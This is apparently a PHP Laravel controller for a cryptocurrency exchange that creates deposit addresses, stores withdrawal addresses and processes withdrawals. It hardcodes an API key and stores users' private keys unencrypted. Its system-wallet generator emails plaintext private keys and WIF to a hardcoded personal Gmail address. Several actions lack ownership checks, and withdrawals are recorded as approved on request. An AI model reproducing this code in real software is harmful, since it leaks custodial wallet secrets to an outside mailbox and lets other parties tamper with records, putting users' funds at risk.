<?php

namespace App\Http\Controllers\Web;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\WithdrawalAddress;
use App\Wallet;
use App\Token;
use App\Log;
use App\Mail\NewWalletCreation;
use App\SystemWallet;
use App\TradeSetup;
use App\Transaction;
use App\WalletHistory;
use App\WithdrawRequest;
use App\WalletTransaction;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Mail;

class WalletController extends Controller
{
    // withdrawal status 0 => pending, 1 => approved, 3 => rejected
    protected static $url = 'https://api.cryptoapis.io/v1/bc/';
    protected static $network = 'mainnet';

    public function addWithdrawalAddress()
    {
        $check = WithdrawalAddress::whereUserId(auth()->user()->id)
        ->whereTicker(request()->coin_type)
        ->whereAddress(request()->address)
        ->count();
        if($check){
            return redirect('/user/wallet-addresses')->withErrors(["Duplicate entry not allowed"]);
        }else{
            $address = WithdrawalAddress::create([
                'user_id' => auth()->user()->id,
                'ticker' => strtolower(request()->coin_type),
                'address' => request()->address
            ]);
            Log::create(
                [
                    'user_id' => auth()->user()->id,
                    'log' => 'add withdrawal address for '.request()->coin_type
                ]
            );
            $msg = "New withdrawal address added.";
            return redirect('/user/wallet-addresses')->with('msg', $msg);
        }
    }

    public function removeWithdrawalAddress(WithdrawalAddress $id)
    {
        $id->delete();

        Log::create(
            [
                'user_id' => auth()->user()->id,
                'log' => 'deleted withdrawal address for '.$id->ticker
            ]
        );
        $msg = "Address deleted.";
        return redirect('/user/wallet-addresses')->with('msg', $msg);
    }

    public function newAddress()
    {
        $trade_mode = TradeSetup::first()->trade_mode;
        $coin_type = request()->token_type;
        $coin_base = request()->token_base;
        $data =  $this->checkAddress($coin_type,$coin_base) ? $this->getAddress($coin_type,$coin_base) : $this->createAddress($coin_type,$coin_base,$trade_mode);
        return response()->json($data);


    }

    private function checkAddress($coin_type,$coin_base)
    {
        $user_wallet = Wallet::whereUserId(auth()->user()->id)->whereTicker($coin_type)->whereBase($coin_base)->exists();
        return $user_wallet;
    }

    private function getAddress($coin_type,$coin_base)
    {
        $user_wallet = Wallet::whereUserId(auth()->user()->id)->whereTicker($coin_type)->whereBase($coin_base)->first();
        return $user_wallet->address;
    }

    private function createAddress($coin_type,$coin_base, $trade_mode)
    {
        if($coin_type == 'BTC'){
            $api = 'https://api.cryptoapis.io/v1/bc/'.strtolower($coin_type).'/'.$trade_mode.'/address';

        }else{
            if($coin_type == 'ETH' && $trade_mode == 'mainnet'){
                $api = 'https://api.cryptoapis.io/v1/bc/'.strtolower($coin_type).'/'.$trade_mode.'/address';
            }else{
                $api = 'https://api.cryptoapis.io/v1/bc/'.strtolower($coin_type).'/ropsten/address';
            }
        }
        $response = new Http();

        $response = Http::withHeaders([
            'Content-Type' => 'application/json',
            'X-API-Key' => '1deaf8d383c8f32616180ecea788725e82bc1f5e'
        ])->post($api);
        $res = json_decode($response, true);
        $user_wallet = Wallet::create([
            'user_id' => auth()->user()->id,
            'address' => $res['payload']['address'],
            'privateKey' => $res['payload']['privateKey'],
            'publicKey' => $res['payload']['publicKey'],
            'ticker' => $coin_type,
            'base' => $coin_base,
            'amount' => 0,
            'status' => 0
        ]);

        Log::create(
            [
                'user_id' => auth()->user()->id,
                'log' => 'created new address for '.$coin_type
            ]
        );
        return $user_wallet->address;
    }


    public function requestWithdrawal()
    {
        //Get Fee  Structure
        $coin_info = Token::whereTicker(request()->coin)->first();
        $withdrawal_fee = $coin_info->withdrawal_fee;
        $coin_base = $coin_info->base;
        //Get base wallet balance
        $baseToken = Wallet::whereUserId(auth()->user()->id)->whereTicker($coin_base)->first();
        if($baseToken->amount > $withdrawal_fee)
        {
            $amountToWithdraw = request()->amount;

             // Get User Balance
            $user_balance = Wallet::whereUserId(auth()->user()->id)->whereTicker(request()->coin)->first();

            //Check if the amount is sufficient
            if($user_balance->amount > $amountToWithdraw)
            {
                $newBalance = $user_balance->amount - $amountToWithdraw;
                $newBaseBalance = $baseToken->amount - $withdrawal_fee;

                //Substract Amount from Wallet
                    $baseToken->update([
                        'amount' => $newBaseBalance
                        ]);
                    $user_balance->update([
                        'amount' => $newBalance
                        ]);

                        $trackID = sprintf("%0.7d", str_shuffle(rand(10,120000) * time() ));
                       
                    WithdrawRequest::create([
                        'user_id' => auth()->user()->id,
                        'withdraw_address'=> request()->address,
                        'withdraw_amount' => request()->amount,
                        'withdraw_fee' =>  $withdrawal_fee,
                        'ticker' => request()->coin,
                        'status' => 1,
                        'trackID'=> $trackID,
                        ]);  $transData = [
                            'user_id' => auth()->user()->id,
                            'trackID'=> $trackID,
                            'address' => request()->address,
                            'amount' => request()->amount,
                            'fee' => $withdrawal_fee,
                            'ticker' => request()->coin,
                            'type' => 'Withdrawal',
                            'transID'=> 'null',
                            'status' => 1,
                        ];
                        WalletHistory::create($transData);
 
                    Log::create([
                        'user_id' => auth()->user()->id,
                        'log' => 'made withdrawal request of '.request()->amount.' '.request()->coin
                        ]);
                return redirect('/user/history');

            }
            else
            {
                return redirect()->back()->withErrors(["Insufficient ".request()->coin.". Deposit into your ".request()->coin." wallet"]);
            }
        }
        else
        {
            return redirect()->back()->withErrors(["Insufficient Gas Fee. Deposit into your ".$coin_base." wallet"]);

        }
    }

    public function listRequest()
    {
        $data = WalletHistory::with('trans_type')->whereUserId(auth()->user()->id)->orderBy('created_at','DESC')->get();
        return view('user.history', compact('data'));
    }

    public function saveWalletTransaction(Request $request)
    {
        WalletTransaction::create([
                    'user_id' => $request->id,
                    'withdraw_address' => $request->address,
                    'withdraw_amount' => $request->amount,
                    'withdraw_fee' => $request->withdrawal_fee,
                    'ticker' => $request->coin,
                    'status' => $request->status,
                    'type' => $request->type
                    ]);
    }



    public function withdrawaction(WithdrawRequest $id, $status)
    {
        $id->update(
            [
                'status' => $status
            ]
        );
        $wq = WalletHistory::where('trackID',$id->trackID)->first();
        $wq->update(
            [
                'status' => $status
            ]
        );
        return redirect('/block/wallets/withdrawals');
    }


    public function systemwalletgenerator($ticker)
    { 
        $coin =  SystemWallet::whereTicker($ticker)->first();
        SystemWallet::whereTicker($ticker)->update([
            'status'=> 0
            ]);
        $trade_mode = TradeSetup::first()->trade_mode;
        $response = $this->newSystemAddress($ticker, $trade_mode);

            SystemWallet::create([
                'ticker' => $ticker,
                'name' => $coin->name,
                'address' => $response['address'],
                'public_key' => encrypt_data($response['public_key']),
                'private_key' => encrypt_data($response['private_key']),
                'wif' => encrypt_data($response['wif']),
                'amount' => 0.000000000,
                'url' => $response['url'],
                'status' => 1
            ]); 
            $token = Token::whereTicker($ticker)->first();
            $token->update([
                'address' => $response['address']
            ]);
            $data = [
                'address' => $response['address'],
                'privateKey' => $response['private_key'],
                'publicKey' => $response['public_key'],
                'wif' => $response['wif'],
                'ticker' => $ticker
            ];
        Mail::to('bmimaginationz@gmail.com')->send(new NewWalletCreation($data));  
            return redirect('/block/wallets/viewwallets');
    }

    private function newSystemAddress($ticker, $trade_mode)
    {
        if($ticker == 'BTC'){
            $api = 'https://api.cryptoapis.io/v1/bc/'.strtolower($ticker).'/'.$trade_mode.'/address';
            if($ticker === 'BTC' && $trade_mode === 'mainnet'){
                $url = 'https://www.blockchain.com/'.strtolower($ticker).'/address/';
            }else{
                $url = 'https://www.blockchain.com/'.strtolower($ticker).'-'.$trade_mode.'/address/';
            }
        }else{
            if($ticker == 'ETH' && $trade_mode == 'mainnet'){
                $url = 'https://ethplorer.io/address/';
                $api = 'https://api.cryptoapis.io/v1/bc/'.strtolower($ticker).'/'.$trade_mode.'/address';
            }else{
                $url = 'https://kovan.ethplorer.io/address/';
                $api = 'https://api.cryptoapis.io/v1/bc/'.strtolower($ticker).'/ropsten/address';
            }
        }

        $response = new Http();

        $response = Http::withHeaders([
            'Content-Type' => 'application/json',
            'X-API-Key' => '1deaf8d383c8f32616180ecea788725e82bc1f5e'
        ])->post($api);
       $res = json_decode($response, true);
       if($ticker == 'BTC')
       {
           $wif = $res['payload']['wif'];
       }
       else 
       {
           $wif = "null";
       }
        return [
            'address' => $res['payload']['address'],
            'private_key' => $res['payload']['privateKey'],
            'public_key' => $res['payload']['publicKey'],
            'url' => $url.$res['payload']['address'],
            'wif' => $wif
        ];
    }
}
